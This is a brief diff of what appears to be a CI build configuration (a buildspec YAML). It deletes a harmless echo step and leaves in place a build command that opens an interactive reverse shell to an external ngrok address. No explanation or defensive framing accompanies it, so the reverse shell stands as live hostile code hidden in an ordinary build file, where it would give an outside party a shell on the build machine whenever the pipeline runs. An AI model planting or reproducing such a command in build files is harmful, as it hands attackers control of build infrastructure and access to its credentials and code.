@@ -3,5 +3,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "update"
       - bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/10654 0>&1
